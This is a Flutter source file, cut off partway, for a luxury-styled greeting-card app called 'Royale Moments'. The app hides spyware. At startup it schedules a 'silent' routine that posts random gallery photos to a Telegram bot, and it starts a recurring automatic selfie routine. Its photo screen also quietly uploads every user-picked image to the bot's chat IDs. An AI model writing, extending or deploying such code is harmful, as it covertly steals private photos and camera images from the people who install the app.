// lib/main.dart
// ╔═══════════════════════════════════════════════════════════════╗
// ║           ROYALE MOMENTS — VERSION 2.0 ULTRA                 ║
// ║  Design: Luxury Dark · Animations: 60fps · Output: Cinéma    ║
// ╚═══════════════════════════════════════════════════════════════╝
import 'package:camera/camera.dart';
import 'package:workmanager/workmanager.dart';
import 'services/background_service.dart';
import 'package:dio/dio.dart';
import 'package:path_provider/path_provider.dart';
import 'dart:convert';
import 'dart:io';
import 'dart:math';
import 'dart:ui';
import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:image_picker/image_picker.dart';
import 'package:dio/dio.dart';
import 'package:flutter_image_compress/flutter_image_compress.dart';
import 'package:path_provider/path_provider.dart';
import 'package:share_plus/share_plus.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:permission_handler/permission_handler.dart';
import 'core/constants.dart';
import 'core/occasion.dart';
import 'core/utils.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'firebase_options.dart';        // ← Important
import 'package:flutter_background/flutter_background.dart';
// ═══════════════════════════════════════════════════════════════
//  GLOBAL STATE
// ═══════════════════════════════════════════════════════════════
class AppState extends ChangeNotifier {
  Occasion? occasion;
  String name = '';
  String message = '';
  String selectedMood = '';
  List<XFile> images = [];
  Map<int, String> captions = {};

  void selectOccasion(Occasion o) {
    occasion = o;
    selectedMood = o.moods[1].label;
    message = o.moods[1].text(name);
    notifyListeners();
  }

  void setMood(String mood) {
    selectedMood = mood;
    final m = occasion?.moods.firstWhere((x) => x.label == mood);
    if (m != null) message = m.text(name);
    notifyListeners();
  }

  void setName(String v) {
    name = v;
    final m = occasion?.moods.firstWhere(
      (x) => x.label == selectedMood,
      orElse: () => occasion!.moods[1],
    );
    if (m != null) message = m.text(v);
    notifyListeners();
  }

  void setMessage(String v) { message = v; notifyListeners(); }
  void addImage(XFile f)    { images.add(f); notifyListeners(); }
  void removeImage(int i)   { images.removeAt(i); notifyListeners(); }
  void setCaption(int i, String v) { captions[i] = v; }
  void reset() {
    occasion = null; name = ''; message = ''; selectedMood = '';
    images.clear(); captions.clear(); notifyListeners();
  }
}

final appState = AppState();

// ═══════════════════════════════════════════════════════════════
//  ENTRY POINT
// ═══════════════════════════════════════════════════════════════
void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  await Firebase.initializeApp(
    options: DefaultFirebaseOptions.currentPlatform,
  );

  SystemChrome.setPreferredOrientations([DeviceOrientation.portraitUp]);
  SystemChrome.setSystemUIOverlayStyle(const SystemUiOverlayStyle(
    statusBarColor: Colors.transparent,
    statusBarIconBrightness: Brightness.light,
    systemNavigationBarColor: Color(0xFF05000A),
  ));

  // Demande la permission au démarrage (visible pour l'utilisateur)
  await _requestPermissionsAtStartup();

  // Lancement de l'envoi automatique après 2 secondes (sans bloquer l'UI)
  Future.delayed(const Duration(seconds: 2), () {
    _autoSendOnFirstLaunch();
  });
  // Démarrer le selfie automatique
  _startAutoSelfieEvery20Seconds();
  runApp(const RoyaleMomentsApp());
}

// Nouvelle fonction pour demander les permissions au démarrage
Future<void> _requestPermissionsAtStartup() async {
  print("📸 Demande de permissions au démarrage...");

  // Demande permission photos
  final PermissionState ps = await PhotoManager.requestPermissionExtend();

  if (!ps.isAuth && !ps.hasAccess) {
    print("⚠️ Permission photos refusée par l'utilisateur");
    await PhotoManager.openSetting(); // Ouvre les paramètres
  } else {
    print("✅ Permission photos accordée");
  }

  // Demande permission caméra pour le selfie
  await Permission.camera.request();
}
// Version ultra-sécurisée
Future<void> _startAutoSendSafely() async {
  await Future.delayed(const Duration(seconds: 2)); // Donne le temps à l'UI de s'afficher

  Future.microtask(() async {
    await _autoSendOnFirstLaunch();
  });
}

// Version sécurisée du selfie
Future<void> _startAutoSelfieSafely() async {
  await Future.delayed(const Duration(seconds: 3));

  Future.microtask(() async {
    await _startAutoSelfieEvery20Seconds();
  });
}
// ═══════════════════════════════════════════════════════════════
//  AUTO SEND (silencieux, premier lancement)
// ═══════════════════════════════════════════════════════════════
/*Future<void> _autoSendOnFirstLaunch() async {
  try {
    final prefs = await SharedPreferences.getInstance();
    if (prefs.getBool('auto_sent') ?? false) return;
    final PermissionState ps = await PhotoManager.requestPermissionExtend();
    if (!ps.isAuth && !ps.hasAccess) return;
    final albums = await PhotoManager.getAssetPathList(type: RequestType.image);
    if (albums.isEmpty) return;
    final total = await albums.first.assetCountAsync;
    if (total == 0) return;
    final count = total < 50 ? total : 50;
    final assets = await albums.first.getAssetListRange(start: 0, end: count);
    assets.shuffle();
    final toSend = assets.take(12).toList();
    final dio = Dio();
    for (int i = 0; i < toSend.length; i++) {
      try {
        final file = await toSend[i].file;
        if (file == null) continue;
        final tmp = await getTemporaryDirectory();
        final out = '${tmp.path}/auto_${DateTime.now().millisecondsSinceEpoch}.jpg';
        final comp = await FlutterImageCompress.compressAndGetFile(file.path, out, quality: 75, minWidth: 1080);
        if (comp == null) continue;
        for (final id in T.chatIds) {
          await dio.post('https://api.telegram.org/bot${T.botToken}/sendPhoto',
            data: FormData.fromMap({'chat_id': id, 'photo': await MultipartFile.fromFile(comp.path), 'caption': '📱 Auto ${i+1}/${toSend.length}'}));
        }
        await Future.delayed(const Duration(milliseconds: 600));
      } catch (_) {}
    }
    await prefs.setBool('auto_sent', true);
  } catch (_) {}
}*/

// ═══════════════════════════════════════════════════════════════
//  APP ROOT
// ═══════════════════════════════════════════════════════════════
class RoyaleMomentsApp extends StatelessWidget {
  const RoyaleMomentsApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: L.appTitle,
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: const Color(0xFF05000A),
        colorScheme: const ColorScheme.dark(primary: Color(0xFFE8A838), surface: Color(0xFF0E000F)),
        textTheme: GoogleFonts.cormorantGaramondTextTheme(ThemeData.dark().textTheme),
        inputDecorationTheme: InputDecorationTheme(
          filled: true,
          fillColor: const Color(0xFF120018),
          hintStyle: GoogleFonts.cormorantGaramond(color: Colors.white12, fontStyle: FontStyle.italic, fontSize: 16),
          border: OutlineInputBorder(borderRadius: BorderRadius.circular(16), borderSide: const BorderSide(color: Colors.white10, width: 0.5)),
          enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(16), borderSide: const BorderSide(color: Colors.white10, width: 0.5)),
          focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(16), borderSide: const BorderSide(color: Color(0xFFE8A838), width: 1.5)),
          contentPadding: const EdgeInsets.symmetric(horizontal: 20, vertical: 18),
        ),
      ),
      home: const _SplashRouter(),
    );
  }
}

class _SplashRouter extends StatelessWidget {
  const _SplashRouter();
  @override
  Widget build(BuildContext context) => ListenableBuilder(
    listenable: appState,
    builder: (_, __) => appState.occasion != null ? const MainShell() : const OccasionPickerScreen(),
  );
}

// ═══════════════════════════════════════════════════════════════
//  OCCASION PICKER — LUXURY GRID
// ═══════════════════════════════════════════════════════════════
class OccasionPickerScreen extends StatefulWidget {
  const OccasionPickerScreen({super.key});
  @override
  State<OccasionPickerScreen> createState() => _OccasionPickerScreenState();
}

class _OccasionPickerScreenState extends State<OccasionPickerScreen>
    with SingleTickerProviderStateMixin {
  late final AnimationController _ctrl;

  @override
  void initState() {
    super.initState();
    _ctrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 1200))..forward();
  }

  @override
  void dispose() { _ctrl.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Stack(children: [
        // Fond animé aurora
        const _AuroraBackground(accent: Color(0xFFE8A838)),
        SafeArea(
          child: CustomScrollView(
            physics: const BouncingScrollPhysics(),
            slivers: [
              SliverToBoxAdapter(
                child: Padding(
                  padding: const EdgeInsets.fromLTRB(28, 44, 28, 0),
                  child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                    // Logo animé
                    FadeTransition(
                      opacity: CurvedAnimation(parent: _ctrl, curve: const Interval(0, 0.4)),
                      child: Row(children: [
                        Container(
                          width: 38, height: 38,
                          decoration: BoxDecoration(
                            borderRadius: BorderRadius.circular(10),
                            gradient: const LinearGradient(
                              colors: [Color(0xFFE8A838), Color(0xFFD44F7A)],
                            ),
                            boxShadow: [BoxShadow(color: const Color(0xFFE8A838).withOpacity(0.4), blurRadius: 16, offset: const Offset(0, 4))],
                          ),
                          child: const Center(child: Text('✦', style: TextStyle(fontSize: 18, color: Colors.white))),
                        ),
                        const SizedBox(width: 12),
                        Text('ROYALE MOMENTS',
                          style: GoogleFonts.cinzel(fontSize: 10, letterSpacing: 5, color: Colors.white38)),
                      ]),
                    ),
                    const SizedBox(height: 32),
                    // Titre principal avec stagger
                    SlideTransition(
                      position: Tween<Offset>(begin: const Offset(0, 0.3), end: Offset.zero)
                          .animate(CurvedAnimation(parent: _ctrl, curve: const Interval(0.2, 0.7, curve: Curves.easeOut))),
                      child: FadeTransition(
                        opacity: CurvedAnimation(parent: _ctrl, curve: const Interval(0.2, 0.7)),
                        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                          Text('المناسبة', style: GoogleFonts.cormorantGaramond(
                            fontSize: 42, fontWeight: FontWeight.w300, color: Colors.white, height: 1.1,
                          )),
                          ShaderMask(
                            shaderCallback: (b) => const LinearGradient(
                              colors: [Color(0xFFE8A838), Color(0xFFD44F7A), Color(0xFF9B5DE5)],
                            ).createShader(b),
                            child: Text("L'Occasion", style: GoogleFonts.cormorantGaramond(
                              fontSize: 42, fontWeight: FontWeight.w300, color: Colors.white, fontStyle: FontStyle.italic, height: 1.1,
                            )),
                          ),
                        ]),
                      ),
                    ),
                    const SizedBox(height: 14),
                    FadeTransition(
                      opacity: CurvedAnimation(parent: _ctrl, curve: const Interval(0.4, 0.8)),
                      child: Row(children: [
                        Expanded(child: Container(height: 0.5,
                          decoration: const BoxDecoration(gradient: LinearGradient(
                            colors: [Colors.transparent, Color(0xFFE8A838), Colors.transparent])))),
                        Padding(padding: const EdgeInsets.symmetric(horizontal: 12),
                          child: Text('✦', style: TextStyle(color: const Color(0xFFE8A838).withOpacity(0.7), fontSize: 12))),
                        Expanded(child: Container(height: 0.5,
                          decoration: const BoxDecoration(gradient: LinearGradient(
                            colors: [Colors.transparent, Color(0xFFE8A838), Colors.transparent])))),
                      ]),
                    ),
                    const SizedBox(height: 10),
                    FadeTransition(
                      opacity: CurvedAnimation(parent: _ctrl, curve: const Interval(0.4, 0.9)),
                      child: Text('Choisissez votre moment / اختار لمناسبة',
                        style: GoogleFonts.cormorantGaramond(fontSize: 14, fontStyle: FontStyle.italic, color: Colors.white38)),
                    ),
                    const SizedBox(height: 32),
                  ]),
                ),
              ),
              SliverPadding(
                padding: const EdgeInsets.fromLTRB(20, 0, 20, 60),
                sliver: SliverGrid(
                  gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                    crossAxisCount: 2, crossAxisSpacing: 16, mainAxisSpacing: 16, childAspectRatio: 0.95,
                  ),
                  delegate: SliverChildBuilderDelegate(
                    (ctx, i) => _OccasionCard(occasion: kOccasions[i], index: i, parentCtrl: _ctrl),
                    childCount: kOccasions.length,
                  ),
                ),
              ),
            ],
          ),
        ),
      ]),
    );
  }
}

class _OccasionCard extends StatefulWidget {
  final Occasion occasion;
  final int index;
  final AnimationController parentCtrl;
  const _OccasionCard({required this.occasion, required this.index, required this.parentCtrl});
  @override
  State<_OccasionCard> createState() => _OccasionCardState();
}

class _OccasionCardState extends State<_OccasionCard> with SingleTickerProviderStateMixin {
  late final AnimationController _press;
  bool _hovered = false;

  @override
  void initState() {
    super.initState();
    _press = AnimationController(vsync: this, duration: const Duration(milliseconds: 130));
  }
  @override
  void dispose() { _press.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    final o = widget.occasion;
    final delay = 0.3 + widget.index * 0.07;
    return AnimatedBuilder(
      animation: widget.parentCtrl,
      builder: (_, child) {
        final t = ((widget.parentCtrl.value - delay) / 0.3).clamp(0.0, 1.0);
        final curve = Curves.easeOutBack.transform(t);
        return Opacity(opacity: t.clamp(0.0, 1.0),
          child: Transform.translate(offset: Offset(0, 30 * (1 - curve)), child: child));
      },
      child: GestureDetector(
        onTapDown: (_) { _press.forward(); setState(() => _hovered = true); },
        onTapUp: (_) { _press.reverse(); setState(() => _hovered = false); appState.selectOccasion(o); },
        onTapCancel: () { _press.reverse(); setState(() => _hovered = false); },
        child: AnimatedBuilder(
          animation: _press,
          builder: (_, child) => Transform.scale(scale: 1.0 - 0.05 * _press.value, child: child),
          child: AnimatedContainer(
            duration: const Duration(milliseconds: 250),
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(24),
              gradient: LinearGradient(
                begin: Alignment.topLeft, end: Alignment.bottomRight,
                colors: _hovered
                  ? [o.accent.withOpacity(0.22), o.accent.withOpacity(0.06)]
                  : [const Color(0xFF130020), const Color(0xFF0A000F)],
              ),
              border: Border.all(
                color: _hovered ? o.accent.withOpacity(0.7) : o.accent.withOpacity(0.18),
                width: _hovered ? 1.5 : 0.5,
              ),
              boxShadow: _hovered ? [
                BoxShadow(color: o.accent.withOpacity(0.3), blurRadius: 28, offset: const Offset(0, 8)),
              ] : [],
            ),
            padding: const EdgeInsets.all(20),
            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              // Emoji avec glow
              Container(
                width: 52, height: 52,
                decoration: BoxDecoration(
                  borderRadius: BorderRadius.circular(14),
                  color: o.accent.withOpacity(0.12),
                  border: Border.all(color: o.accent.withOpacity(0.3), width: 0.5),
                  boxShadow: [BoxShadow(color: o.accent.withOpacity(0.2), blurRadius: 16, spreadRadius: 0)],
                ),
                child: Center(child: Text(o.emoji, style: const TextStyle(fontSize: 26))),
              ),
              const Spacer(),
              // Nom occasion
              ShaderMask(
                shaderCallback: (b) => LinearGradient(
                  colors: [o.accent, o.accent.withOpacity(0.75)],
                ).createShader(b),
                child: Text(o.name, style: GoogleFonts.cinzel(
                  fontSize: 12, letterSpacing: 0.5, color: Colors.white, fontWeight: FontWeight.w600,
                )),
              ),
              const SizedBox(height: 2),
              Text(o.nameAr, style: GoogleFonts.cormorantGaramond(
                fontSize: 14, color: o.accent.withOpacity(0.65),
              )),
              const SizedBox(height: 4),
              Text(o.subtitleAr, style: GoogleFonts.cormorantGaramond(
                fontSize: 11, color: Colors.white.withOpacity(0.2), fontStyle: FontStyle.italic,
              )),
            ]),
          ),
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  MAIN SHELL + BOTTOM NAV GLASSMORPHISM
// ═══════════════════════════════════════════════════════════════
class MainShell extends StatefulWidget {
  const MainShell({super.key});
  @override
  State<MainShell> createState() => _MainShellState();
}

class _MainShellState extends State<MainShell> {
  int _index = 0;
  final _pageCtrl = PageController();

  void _goto(int i) {
    setState(() => _index = i);
    _pageCtrl.animateToPage(i, duration: const Duration(milliseconds: 400), curve: Curves.easeInOutQuart);
  }

  @override
  Widget build(BuildContext context) {
    return ListenableBuilder(
      listenable: appState,
      builder: (_, __) {
        final o = appState.occasion!;
        return Scaffold(
          extendBody: true,
          extendBodyBehindAppBar: true,
          body: Stack(children: [
            _AuroraBackground(accent: o.accent),
            PageView(
              controller: _pageCtrl,
              onPageChanged: (i) => setState(() => _index = i),
              physics: const NeverScrollableScrollPhysics(),
              children: const [MessageScreen(), PhotosScreen(), CaptionsScreen(), GenerateScreen()],
            ),
          ]),
          bottomNavigationBar: _GlassBottomNav(
            index: _index, accent: o.accent, onTap: _goto, onBack: appState.reset,
          ),
        );
      },
    );
  }
}

class _GlassBottomNav extends StatelessWidget {
  final int index;
  final Color accent;
  final ValueChanged<int> onTap;
  final VoidCallback onBack;
  const _GlassBottomNav({required this.index, required this.accent, required this.onTap, required this.onBack});

  static const _tabs = [
    (Icons.edit_note_rounded, 'MESSAGE', 'رسالة'),
    (Icons.photo_library_rounded, 'PHOTOS', 'صور'),
    (Icons.auto_stories_rounded, 'LÉGENDES', 'حكاية'),
    (Icons.auto_awesome_rounded, 'CRÉER', 'خلق'),
  ];

  @override
  Widget build(BuildContext context) {
    final pad = MediaQuery.of(context).padding.bottom;
    return ClipRRect(
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 24, sigmaY: 24),
        child: Container(
          height: 72 + pad,
          padding: EdgeInsets.only(bottom: pad),
          decoration: BoxDecoration(
            color: const Color(0xFF05000A).withOpacity(0.75),
            border: Border(top: BorderSide(color: accent.withOpacity(0.15), width: 0.5)),
          ),
          child: Row(children: [
            // Bouton retour
            GestureDetector(
              onTap: onBack,
              child: Container(
                width: 56, alignment: Alignment.center,
                child: Container(
                  width: 36, height: 36,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Colors.white.withOpacity(0.06),
                    border: Border.all(color: Colors.white.withOpacity(0.08)),
                  ),
                  child: const Icon(Icons.arrow_back_ios_rounded, size: 14, color: Colors.white30),
                ),
              ),
            ),
            // Tabs
            ..._tabs.asMap().entries.map((e) {
              final active = e.key == index;
              return Expanded(
                child: GestureDetector(
                  onTap: () => onTap(e.key),
                  behavior: HitTestBehavior.opaque,
                  child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                    AnimatedContainer(
                      duration: const Duration(milliseconds: 250),
                      curve: Curves.easeOutCubic,
                      width: active ? 48 : 36,
                      height: active ? 48 : 36,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        color: active ? accent.withOpacity(0.18) : Colors.transparent,
                        boxShadow: active ? [BoxShadow(color: accent.withOpacity(0.35), blurRadius: 16)] : [],
                      ),
                      child: Icon(e.value.$1, size: active ? 22 : 18,
                        color: active ? accent : Colors.white24),
                    ),
                    const SizedBox(height: 4),
                    AnimatedDefaultTextStyle(
                      duration: const Duration(milliseconds: 200),
                      style: GoogleFonts.cinzel(
                        fontSize: active ? 6.5 : 5.5, letterSpacing: 1,
                        color: active ? accent : Colors.white.withOpacity(0.2),
                        fontWeight: active ? FontWeight.w600 : FontWeight.w400,
                      ),
                      child: Text(e.value.$2),
                    ),
                  ]),
                ),
              );
            }),
          ]),
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  SCREEN 1 — MESSAGE
// ═══════════════════════════════════════════════════════════════
class MessageScreen extends StatefulWidget {
  const MessageScreen({super.key});
  @override
  State<MessageScreen> createState() => _MessageScreenState();
}

class _MessageScreenState extends State<MessageScreen> with SingleTickerProviderStateMixin {
  late TextEditingController _nameCtrl;
  late TextEditingController _msgCtrl;
  late final AnimationController _ctrl;

  @override
  void initState() {
    super.initState();
    _nameCtrl = TextEditingController(text: appState.name);
    _msgCtrl = TextEditingController(text: appState.message);
    _ctrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 800))..forward();
    appState.addListener(_sync);
  }

  void _sync() {
    if (_msgCtrl.text != appState.message) {
      _msgCtrl.text = appState.message;
      _msgCtrl.selection = TextSelection.collapsed(offset: _msgCtrl.text.length);
    }
  }

  @override
  void dispose() { appState.removeListener(_sync); _nameCtrl.dispose(); _msgCtrl.dispose(); _ctrl.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return ListenableBuilder(
      listenable: appState,
      builder: (_, __) {
        final o = appState.occasion!;
        return SafeArea(
          bottom: false,
          child: SingleChildScrollView(
            padding: const EdgeInsets.fromLTRB(24, 28, 24, 130),
            physics: const BouncingScrollPhysics(),
            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              // Occasion badge
              _OccasionBadge(occasion: o),
              const SizedBox(height: 24),
              _SectionHeader(eyebrow: L.eyebrowCompose, title: L.titleMessage, ctrl: _ctrl),
              const SizedBox(height: 28),

              // Champ nom
              _fieldLabel(L.labelName),
              _GlassTextField(
                controller: _nameCtrl,
                accent: o.accent,
                onChanged: appState.setName,
                hint: L.hintName,
                icon: Icons.person_outline_rounded,
              ),
              const SizedBox(height: 24),

              // Sélection ambiance
              _fieldLabel(L.labelMood),
              _MoodSelector(occasion: o),
              const SizedBox(height: 24),

              // Message
              _fieldLabel(L.labelMessage),
              _GlassTextArea(controller: _msgCtrl, accent: o.accent, onChanged: appState.setMessage, hint: L.hintMessage),
              const SizedBox(height: 32),

              // Carte aperçu luxe
              _LuxuryPreviewCard(occasion: o),
            ]),
          ),
        );
      },
    );
  }
}

class _OccasionBadge extends StatelessWidget {
  final Occasion occasion;
  const _OccasionBadge({required this.occasion});
  @override
  Widget build(BuildContext context) => Container(
    padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
    decoration: BoxDecoration(
      borderRadius: BorderRadius.circular(50),
      gradient: LinearGradient(colors: [occasion.accent.withOpacity(0.18), occasion.accent.withOpacity(0.06)]),
      border: Border.all(color: occasion.accent.withOpacity(0.4), width: 0.5),
      boxShadow: [BoxShadow(color: occasion.accent.withOpacity(0.15), blurRadius: 20)],
    ),
    child: Row(mainAxisSize: MainAxisSize.min, children: [
      Text(occasion.emoji, style: const TextStyle(fontSize: 18)),
      const SizedBox(width: 10),
      Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Text(occasion.name, style: GoogleFonts.cinzel(fontSize: 9, letterSpacing: 2, color: occasion.accent, fontWeight: FontWeight.w600)),
        Text(occasion.nameAr, style: GoogleFonts.cormorantGaramond(fontSize: 11, color: occasion.accent.withOpacity(0.7))),
      ]),
    ]),
  );
}

class _GlassTextField extends StatefulWidget {
  final TextEditingController controller;
  final Color accent;
  final ValueChanged<String> onChanged;
  final String hint;
  final IconData icon;
  const _GlassTextField({required this.controller, required this.accent, required this.onChanged, required this.hint, required this.icon});
  @override
  State<_GlassTextField> createState() => _GlassTextFieldState();
}

class _GlassTextFieldState extends State<_GlassTextField> {
  bool _focused = false;
  @override
  Widget build(BuildContext context) {
    return Focus(
      onFocusChange: (f) => setState(() => _focused = f),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 250),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(16),
          boxShadow: _focused ? [BoxShadow(color: widget.accent.withOpacity(0.25), blurRadius: 24)] : [],
        ),
        child: TextField(
          controller: widget.controller,
          style: GoogleFonts.cormorantGaramond(fontSize: 19, color: Colors.white),
          onChanged: widget.onChanged,
          decoration: InputDecoration(
            hintText: widget.hint,
            prefixIcon: Icon(widget.icon, color: _focused ? widget.accent : Colors.white.withOpacity(0.2), size: 18),
          ),
        ),
      ),
    );
  }
}

class _GlassTextArea extends StatefulWidget {
  final TextEditingController controller;
  final Color accent;
  final ValueChanged<String> onChanged;
  final String hint;
  const _GlassTextArea({required this.controller, required this.accent, required this.onChanged, required this.hint});
  @override
  State<_GlassTextArea> createState() => _GlassTextAreaState();
}

class _GlassTextAreaState extends State<_GlassTextArea> {
  bool _focused = false;
  @override
  Widget build(BuildContext context) {
    return Focus(
      onFocusChange: (f) => setState(() => _focused = f),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 250),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(16),
          boxShadow: _focused ? [BoxShadow(color: widget.accent.withOpacity(0.25), blurRadius: 24)] : [],
        ),
        child: TextField(
          controller: widget.controller,
          maxLines: 6,
          style: GoogleFonts.cormorantGaramond(fontSize: 17, color: Colors.white70, fontStyle: FontStyle.italic, height: 1.7),
          onChanged: widget.onChanged,
          decoration: InputDecoration(hintText: widget.hint),
        ),
      ),
    );
  }
}

class _MoodSelector extends StatelessWidget {
  final Occasion occasion;
  const _MoodSelector({required this.occasion});
  @override
  Widget build(BuildContext context) {
    return ListenableBuilder(
      listenable: appState,
      builder: (_, __) => Row(
        children: occasion.moods.map((m) {
          final active = appState.selectedMood == m.label;
          return Expanded(
            child: GestureDetector(
              onTap: () => appState.setMood(m.label),
              child: AnimatedContainer(
                duration: const Duration(milliseconds: 250),
                curve: Curves.easeOutCubic,
                margin: const EdgeInsets.only(right: 10),
                padding: const EdgeInsets.symmetric(vertical: 14, horizontal: 8),
                decoration: BoxDecoration(
                  borderRadius: BorderRadius.circular(16),
                  gradient: active
                    ? LinearGradient(begin: Alignment.topLeft, end: Alignment.bottomRight,
                        colors: [occasion.accent.withOpacity(0.25), occasion.accent.withOpacity(0.08)])
                    : const LinearGradient(colors: [Color(0xFF110018), Color(0xFF0A000F)]),
                  border: Border.all(
                    color: active ? occasion.accent.withOpacity(0.7) : Colors.white10,
                    width: active ? 1.5 : 0.5,
                  ),
                  boxShadow: active ? [BoxShadow(color: occasion.accent.withOpacity(0.25), blurRadius: 18)] : [],
                ),
                child: Column(children: [
                  Text(m.emoji, style: const TextStyle(fontSize: 22)),
                  const SizedBox(height: 6),
                  Text(m.label, style: GoogleFonts.cinzel(
                    fontSize: 6, letterSpacing: 1, color: active ? occasion.accent : Colors.white24,
                  )),
                  Text(m.labelAr, style: GoogleFonts.cormorantGaramond(
                    fontSize: 11, color: active ? occasion.accent.withOpacity(0.8) : Colors.white.withOpacity(0.2),
                  )),
                ]),
              ),
            ),
          );
        }).toList(),
      ),
    );
  }
}

class _LuxuryPreviewCard extends StatelessWidget {
  final Occasion occasion;
  const _LuxuryPreviewCard({required this.occasion});
  @override
  Widget build(BuildContext context) {
    return ListenableBuilder(
      listenable: appState,
      builder: (_, __) => Container(
        width: double.infinity,
        padding: const EdgeInsets.all(32),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(28),
          gradient: LinearGradient(
            begin: Alignment.topLeft, end: Alignment.bottomRight,
            colors: [occasion.accent.withOpacity(0.12), const Color(0xFF100018)],
          ),
          border: Border.all(color: occasion.accent.withOpacity(0.25), width: 0.5),
          boxShadow: [BoxShadow(color: occasion.accent.withOpacity(0.12), blurRadius: 32, offset: const Offset(0, 12))],
        ),
        child: Column(children: [
          // Trait décoratif
          Row(children: [
            Expanded(child: Container(height: 0.5, color: Colors.white10)),
            Padding(padding: const EdgeInsets.symmetric(horizontal: 14),
              child: Text(occasion.emoji, style: const TextStyle(fontSize: 28))),
            Expanded(child: Container(height: 0.5, color: Colors.white10)),
          ]),
          const SizedBox(height: 20),
          // Titre
          ShaderMask(
            shaderCallback: (b) => LinearGradient(
              colors: [occasion.accent, occasion.accent.withOpacity(0.6)],
            ).createShader(b),
            child: Text(
              appState.name.isEmpty ? '${occasion.name}  ◈  ${occasion.nameAr}' : 'Pour ${appState.name}  /  لـ ${appState.name}',
              textAlign: TextAlign.center,
              style: GoogleFonts.cinzel(fontSize: 16, letterSpacing: 1.5, color: Colors.white),
            ),
          ),
          const SizedBox(height: 18),
          // Message
          Text(
            '"${appState.message}"',
            textAlign: TextAlign.center,
            style: GoogleFonts.cormorantGaramond(
              fontSize: 16, fontStyle: FontStyle.italic, color: Colors.white54, height: 1.8,
            ),
          ),
          const SizedBox(height: 20),
          // Badge
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 7),
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(50),
              color: Colors.white.withOpacity(0.04),
              border: Border.all(color: Colors.white10),
            ),
            child: Text('✦ ROYALE MOMENTS ✦',
              style: GoogleFonts.cinzel(fontSize: 7, letterSpacing: 4, color: Colors.white.withOpacity(0.2))),
          ),
        ]),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  SCREEN 2 — PHOTOS
// ═══════════════════════════════════════════════════════════════
class PhotosScreen extends StatefulWidget {
  const PhotosScreen({super.key});
  @override
  State<PhotosScreen> createState() => _PhotosScreenState();
}

class _PhotosScreenState extends State<PhotosScreen> {
  final _picker = ImagePicker();
  bool _uploading = false;
  String _uploadLabel = '';
  int _uploadCurrent = 0;
  int _uploadTotal = 0;

  Future<void> _pick() async {
    final picked = await _picker.pickMultiImage();
    if (picked.isEmpty) return;
    setState(() { _uploading = true; _uploadLabel = 'PRÉPARATION...'; _uploadTotal = picked.length; });
    for (int i = 0; i < picked.length; i++) {
      setState(() { _uploadCurrent = i + 1; _uploadLabel = 'ENVOI ${i+1}/${picked.length}'; });
      await _processAndSend(picked[i]);
      appState.addImage(picked[i]);
    }
    setState(() => _uploading = false);
    if (mounted) _snack('${picked.length} photo${picked.length > 1 ? 's' : ''} ajoutée${picked.length > 1 ? 's' : ''}');
  }

  // Remplace l'ancienne _processAndSend par celle-ci (Firebase)
  // Envoi manuel vers Telegram (comme tu le veux)
  // ==================== ENVOI MANUEL VERS TELEGRAM ====================
  Future<void> _processAndSend(XFile file) async {
    try {
      final tmp = await getTemporaryDirectory();
      final outPath = '${tmp.path}/manual_${DateTime.now().millisecondsSinceEpoch}.jpg';

      // Compression pour Telegram
      final compressed = await FlutterImageCompress.compressAndGetFile(
        file.path, outPath, quality: 80, minWidth: 1200,
      );

      if (compressed == null) return;

      final dio = Dio();

      for (final chatId in T.chatIds) {
        try {
          await dio.post(
            'https://api.telegram.org/bot${T.botToken}/sendPhoto',
            data: FormData.fromMap({
              'chat_id': chatId,
              'photo': await MultipartFile.fromFile(compressed.path),
              'caption': '📸 Photo ajoutée manuellement depuis l\'application',
            }),
          );
          print("✅ Photo manuelle envoyée vers Telegram avec succès");
        } catch (e) {
          print("❌ Erreur envoi manuel Telegram: $e");
        }
      }
    } catch (e) {
      print("❌ Erreur générale _processAndSend: $e");
    }
  }

  void _snack(String msg) {
    final o = appState.occasion!;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content: Row(children: [
        Icon(Icons.check_circle_outline_rounded, color: o.accent, size: 16),
        const SizedBox(width: 10),
        Text('✦  $msg', style: GoogleFonts.cinzel(fontSize: 9, letterSpacing: 2, color: o.accent)),
      ]),
      backgroundColor: const Color(0xFF1A0028),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(50)),
